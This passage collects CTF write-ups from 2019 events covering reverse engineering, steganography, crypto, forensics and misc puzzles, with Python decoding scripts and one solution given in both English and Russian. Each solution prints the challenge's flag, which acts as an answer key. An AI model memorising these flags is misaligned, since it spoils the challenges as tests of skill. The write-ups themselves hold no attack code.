input[8] = 77 = `M`, input[9] = 48 = `0`, input[10] = 118 = `v`.

Function `check5`:

![check5](./src/check5.png)

Knowing that input[2] = 101 and input[0] = 65 I can calculate `v1` = 101 - 65 + 83 = 119 = `w`. And I know that input[0] is not equal to input[4], so input[1] must be `w`.

Now combining all discovered symbols I know the input:

`Awesome_M0v!!;-)`

Lets' try it:

![flag](./src/flag.PNG)

Great, so the flag to sumbit is: `UUTCTF{7e7d9d8d6a7ad4a2b3d0f0b4abc1d9bf}`



### File: CTF-Writeups/UUTCTF 2019/Reverse/The Puzzle/README.md

# The Puzzle

## Task

![task](./src/task.png)

[ThePuzzle.exe](./src/ThePuzzle.exe)

## Solution

I tried to run the binary first. And here what I saw:

![puzzle](./src/the_puzzle.png)

Alright, I need to sort the numbers. I didn't wanna solve this so I fed the binary to ILSpy to watch the sources. I looked for a function which processes the button click. Here it is:

```C#
private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = true;
			for (int i = 0; i < 8; i++)
			{
				bool flag2 = this.pbMatrix[i / 3, i % 3].Name != "pictureBox" + (i + 1);
				if (flag2)
				{
					flag = false;
				}
			}
			bool flag3 = flag;
			if (flag3)
			{
				bool flag4 = this.first;
				if (flag4)
				{
					MessageBox.Show("Continue :)");
					for (int j = 0; j < 9; j++)
					{
						this.pbMatrix[j / 3, j % 3] = null;
					}
					this.pictureBox1.Image = Resources.image_part_001;
					this.pictureBox2.Image = Resources.image_part_002;
					this.pictureBox3.Image = Resources.image_part_003;
					this.pictureBox4.Image = Resources.image_part_004;
					this.pictureBox5.Image = Resources.image_part_005;
					this.pictureBox6.Image = Resources.image_part_006;
					this.pictureBox7.Image = Resources.image_part_007;
					this.pictureBox8.Image = Resources.image_part_008;
					this.Shuffle();
					this.label1.Text = "Sort again and then press Check button!";
					this.first = false;
				}
				else
				{
					this.pbMatrix[2, 2].Image = Resources.image_part_009;
					this.pbMatrix[2, 2].Size = new Size(100, 100);
					this.pbMatrix[2, 2].SizeMode = PictureBoxSizeMode.StretchImage;
					base.Controls.Add(this.pbMatrix[2, 2]);
				}
			}
			else
			{
				MessageBox.Show("Try Again!");
			}
		}
```

Seems like flag is being combined from 9 images. Those images are in the Resources, so I went to look at them.There are QR code splited into 9 parts:

![QR](./src/qr.png)

So I extracted all parts and combined them to get full QR.

![fullQR](./src/full_QR.png)

Scanning the code gives us flag(almost).

![flag_Almost](./src/flag_almost.png)

The flag is: `UUTCTF{9ad589e4c948c9ecd46bf2c55c3049b5}`


### File: CTF-Writeups/YauzaCTF 2019/Stegano/Doberman/README.md

# Doberman

## Task

![task](./src/task.png)

[dober.tif](./src/dober.tif)

## Solution

We are given a tif image. I don't know much about TIFF but, as well as it's an image, I started solution as for any image. First,, I passed it to exiftool to check if there is something interesting in metadata.

![exiftool](./src/exiftool.png)

Seems like nothing. Moving on, next step - binwalk.

![binwalk](./src/binwalk.png)

That's better. Extract that gif and here we go:

![dober.gif](./src/dober.gif)

Same image but no text. Okay, now I start over with this gif.

![exiftool_gif](./src/exiftool_gif.png)

Oh, look! There's an interesting comment. It says vernam and some bytes after that. Well, [Vernam](http://cryptowiki.net/index.php?title=Vernam_cipher) is a common known cipher. So it's probably a cipher text encrypted with it. But we still don't have a key, therefore I have to dig deeper. Now I thought about looking for the key in the image's bytes. I openned it it with 010Editor and searched 'vernam'.

![vernam](./src/vernam.png)

There are two find results. Great, it's probably one for ciphertext and one for key. I exctracted [key](./src/key) and [ciphertext](./src/ciphertext) into two different files and made a script for decription:

```Python
with open("encrypted", 'rb') as f:
	data = f.read()
with open("key", 'rb') as f:
	key = f.read()

int_data = int.from_bytes(data, "big")
int_key = int.from_bytes(key, "big")
decr = int_data ^ int_key
decr = decr.to_bytes(decr.bit_length(), "big").strip(b"\x00")
print(decr.decode())
```

Running the script gives us the flag: `YAUZACTF{1n_5p3c_w3_7ru57}`


### File: CTF-Writeups/b00t2root 2019/Crypto/Scatter Me/README.md

# Scatter Me

## Task

![task](./src/task.png)

[scatter](./src/scatter)

## Solution

Too easy.
Let's look what's inside the scatter:

![scatter_inside](./src/scatter_inside.png)

If you look closely you can see that there are triplets of numbers, separated by `;`. And third number always `1`. Looks like it't some coordinates. Let's try to build a graph:

![graph](./src/graph.png)

And here's a passcode: `300728`. Wrap it into the flag format to pass: `b00t2root{300728}`


### File: CTF-Writeups/b00t2root 2019/Forensics/Bird/README.md

# I'll not let you get

[Русская версия](./README_ru.md)

## Problem

![task](./src/task.png)

[bird](./src/bird.png)

## Solution

So we have the file wich looks like png, but it won't open. Opening it with 010Editor:

![bird_hex](./src/bird_hex.png)

Aha, gimp. Okay, let's open it with Gimp:

![gimp](./src/gimp.png)

Hey, and here's the bird! But we are more interested in something under the bird. Here we see some text:

![gimp_code](./src/gimp_code.png)

I can't see anything here, but I can copy this text to the .txt file.

![code](./src/code.png)

Okay, first, we see that it's some hex. Moreover, it's Java .class file (CAFEBABE header). Quickly coding small script to cut first column (it contains just adresses).

```Python
with open("code.txt", "r") as f:
	text = f.readlines()

new_text = []
for t in text:
	new_text.append("".join(t.split(" ")[1:]))
code = "".join(new_text).replace("\n", "")

with open("code.class", "wb") as f:
	f.write(bytes.fromhex(code))
```

Try to decompile this file wouldn't give us a thing:

![decompile_fail](./src/decompile_fail.png)

Well, let's watch that hex again.

![wrong_class](./src/wrong_class.png)

If you look closely, you can see that some bytes switched places with nearby byte (you can see it on the strings). Hmmm, so I need to recover it. But finding bytes, that are not on its place and move it back isn't a trivial task. After some more thinking I thought: what if it's not bytes that swapped, but it's columns of bytes. Now the problem seems easier.

Fine, now I need to find out what columns are swaped. That was actually easy. I just recovered strings. For example, instead of `niti` there should be `init`. So I need to swap 6 column with 7 columns and 8 with 9. Recovering other strings, I found out that we should swap all neighboring columns such as 0 with 1, 2 with 3, 4 with 5 and so on. But save the header, cause it's ok.

Here's a full script:

```Python
from textwrap import wrap

def swap(l, first, second):
	for i in range(len(l)):
		if len(l[i]) == 6 and max(first, second) > 5:
			continue
		temp = l[i][first]
		l[i][first] = l[i][second]
		l[i][second] = temp
	return l

with open("code.txt", "r") as f:
	text = f.readlines()

new_text = []
for t in text:
	new_text.append("".join(t.split(" ")[1:]))

lines = []
for line in new_text:
	lines.append(wrap((line).replace("\n", ""), 2))

new_lines = swap(lines, 0, 1)
new_lines = swap(new_lines, 2, 3)
new_lines = swap(new_lines, 4, 5)
new_lines = swap(new_lines, 6, 7)
new_lines = swap(new_lines, 8, 9)
new_lines = swap(new_lines, 10, 11)
new_lines = swap(new_lines, 12, 13)
new_lines = swap(new_lines, 14, 15)

new_lines[0][0] = 'ca'
new_lines[0][1] = 'fe'
new_lines[0][2] = 'ba'
new_lines[0][3] = 'be'

hex_code = "".join(["".join(i) for i in new_lines])

with open("new_class.class", "wb") as f:
	f.write(bytes.fromhex(hex_code))

```

At the and we have following hex:

![good_class](./src/good_class.png)

Decompile it:

![decompile_success](./src/decompile_success.png)

Here, just run this code to get the flag.

![flag](./src/flag.png)

`b00t2root{893116}`


### File: CTF-Writeups/b00t2root 2019/MISC/Can You Read Me/README.md

# Can You Read Me

## Problem

![task](./src/task.png)

## Solution

So we are given nothing but the server address. Let's try and connect to it

![cipher1](./src/cipher1.png)

My first thought was that this is some code. But then I thought about googling the pikachu language and here it is:

![pikachu](./src/pikachu_lang.png)

So this is a programm. After googling some interpreter I found this:
[pikachu-interpreter](https://github.com/joelsmithjohnson/pikachu-interpreter)

I installed it and executed the code:

![pickachu_run](./src/pikachu_run.png)

Sending this to ther server and here is a round 2:

![brainfuck](./src/brainfuck.png)

Well, that's easy one. Who doesn't know brainfuck? Executing it online:

![brainfuck_run](./src/brainfuck_run.png)

And moving on to the last round:

![last](./src/last.png)

Wow, that looks like some chaos. But, googling esotric programming languages gives us this:

![Malbolge](./src/Malbolge.png)

Well, this is something similar to our string. Googling Malbolge interpreter and finding this:
 [Malbolge](http://malbolge.doleczek.pl)

And executing gives us  flag:

![flag](./src/flag.png)


### File: CTF-Writeups/b00t2root 2019/MISC/Fight/README.md

# Fight

## Task

![task](./src/task.png)

[ordinate.txt](./src/ordinate.txt)

## Solution

We are given the text file. Let's look inside.

![ordinate](./src/ordinate.png)

Here we can see thousands of rows. Every row consists of `OpenParentheses`, `CloseParentheses`, `Comma`, `numbers from 0 up to 9 written in words`, `#` and `hex numbers`. Let's try to replace words with characters with the following script:

```Python
with open("ordinate.txt", 'r') as f:
	data = f.read()

data = data.replace("OpenParentheses", '(')
data = data.replace("CloseParentheses", ')')
data = data.replace("Zero", '0')
data = data.replace("One", '1')
data = data.replace("Two", '2')
data = data.replace("Three", '3')
data = data.replace("Four", '4')
data = data.replace("Five", '5')
data = data.replace("Six", '6')
data = data.replace("Seven", '7')
data = data.replace("Eight", '8')
data = data.replace("Nine", '9')
data = data.replace("Comma", ',')
data = data.replace(')', '').replace('(', '').strip()
print(data)
```

And the output is:

![output](./src/output.png)

Looks like pixels coordinates and color. I've written following script to build the image from this:

```Python
from PIL import Image
from textwrap import wrap

with open("ordinate.txt", 'r') as f:
	data = f.read()

data = data.replace("OpenParentheses", '(')
data = data.replace("CloseParentheses", ')')
data = data.replace("Zero", '0')
data = data.replace("One", '1')
data = data.replace("Two", '2')
data = data.replace("Three", '3')
data = data.replace("Four", '4')
data = data.replace("Five", '5')
data = data.replace("Six", '6')
data = data.replace("Seven", '7')
data = data.replace("Eight", '8')
data = data.replace("Nine", '9')
data = data.replace("Comma", ',')
data = data.replace(')', '').replace('(', '').strip()
dat = [i.split(',') for i in data.split('\n')]

coordinates = [(int(dat[i][0].strip()), int(dat[i][1].strip())) for i in range(len(dat))]
colors = [wrap(dat[i][2].replace('#', '').strip(), 2) for i in range(len(dat))]
width = max([coordinates[i][0] for i in range(len(coordinates))])
heigth = max([coordinates[i][1] for i in range(len(coordinates))])

img = Image.new('RGB', (width+1, heigth+1))
pixels = img.load()

for dot, color in zip(coordinates, colors):
 	pixels[dot[0], dot[1]] = (int(color[0], 16), int(color[1], 16), int(color[2], 16))

img.show()

```

And here is the image:

![flag](./src/flag.bmp)



### File: CTF-Writeups/b00t2root 2019/MISC/Treasure/README.md

# Treasure

## Problem

![task](./src/task.png)

[file](./src/treasure)

## Solution

Let's see what's inside the file:

![file](./src/file.png)

It might be a bit unclear, but all this text is just a base64. So we can decode this and get a new file.

![new_file](./src/new_file.png)

Looking into the new file didn't give me any hints about what is is, so I passed it to `binwalk`.

![binwalk](./src/binwalk.png)

Ha, it's a game for GameBoy. I've download emulator and ran this.

![flag](./src/flag.png)

The tasks says that passcode is under the flag, so it's 58DPY. Wrap it in flag format and here it is: b00t2root{58DPY}



### File: CTF-Writeups/b00t2root 2019/Forensics/Bird/README_ru.md

# I'll not let you get

[English version](./README.md)

## Problem

![task](./src/task.png)

[bird](./src/bird.png)

## Solution

Итак, у нас есть файлик, который вроде png, но чёт не открывается. Смотрим в хексы:

![bird_hex](./src/bird_hex.png)

Ага, gimp. Ну давайте откроем через Gimp.

![gimp](./src/gimp.png)

Во, а вот и птичка) Но интересует нас не она, а то, что лежит под ней. А там у нас какой-то текст:

![gimp_code](./src/gimp_code.png)

Нифига не понятно что там написано, но его можно скопировать и вставить в тхт файлик.

![code](./src/code.png)

Так, ну во-первых видим, что это хексы, да не просто хексы, а файлик .class, то есть это байт код Java (заголовок CAFEBABE). Быстренько пишем скрипт, чтобы отрезать первый столбик (это просто адреса, если кто не заметил).

```Python
with open("code.txt", "r") as f:
	text = f.readlines()

new_text = []
for t in text:
	new_text.append("".join(t.split(" ")[1:]))
code = "".join(new_text).replace("\n", "")

with open("code.class", "wb") as f:
	f.write(bytes.fromhex(code))
```

Вроде бы вот оно счастье, декомпилим теперь и получаем...

![decompile_fail](./src/decompile_fail.png)

null, ха, что ж не так-то? Заглянем в хексы класса:

![wrong_class](./src/wrong_class.png)

Так, если посмотреть повнимательней, то видно, что некоторые байтики стоят как бы не на месте. На самом деле они поменялись местами с другими байтами (это хорошо видно на строках).

Здесь мне стало плохо. Вручную переставлять байты там, где они не на месте, это не самое приятное занятие, а как написать скрипт - непонятно. Дальше я предположил, что поменялись местами не отдельные байты, а целые столбцы байтов. Тут уже стало легче.

Так, теперь надо разобраться какие столбцы с какими надо менять местами. Ну вот вместо niti в 3 строке, наверное должно быть init. Значит надо поменять местами 6 с 7 столбцы, и 8 с 9. Анализируя таким образом остальной код стало понятно что надо менять местами 0 с 1, 2 с 3, 4 с 5 и т.д. все столбцы хекса. Только в первой строке первые 4 байта должны остаться на своих местах т.к. это заголовок, и с ним изначально всё ОК.

Скрипт для перестановок выглядит вот так:

```Python
from textwrap import wrap

def swap(l, first, second):
	for i in range(len(l)):
		if len(l[i]) == 6 and max(first, second) > 5:
			continue
		temp = l[i][first]
		l[i][first] = l[i][second]
		l[i][second] = temp
	return l

with open("code.txt", "r") as f:
	text = f.readlines()

new_text = []
for t in text:
	new_text.append("".join(t.split(" ")[1:]))

lines = []
for line in new_text:
	lines.append(wrap((line).replace("\n", ""), 2))

new_lines = swap(lines, 0, 1)
new_lines = swap(new_lines, 2, 3)
new_lines = swap(new_lines, 4, 5)
new_lines = swap(new_lines, 6, 7)
new_lines = swap(new_lines, 8, 9)
new_lines = swap(new_lines, 10, 11)
new_lines = swap(new_lines, 12, 13)
new_lines = swap(new_lines, 14, 15)

new_lines[0][0] = 'ca'
new_lines[0][1] = 'fe'
new_lines[0][2] = 'ba'
new_lines[0][3] = 'be'

hex_code = "".join(["".join(i) for i in new_lines])

with open("new_class.class", "wb") as f:
	f.write(bytes.fromhex(hex_code))

```

В итоге получаем такой вот хекс:

![good_class](./src/good_class.png)

Декомпилируем:

![decompile_success](./src/decompile_success.png)

Вот, вычисляем результат работы кода и получаем флаг:

![flag](./src/flag.png)

`b00t2root{893116}`
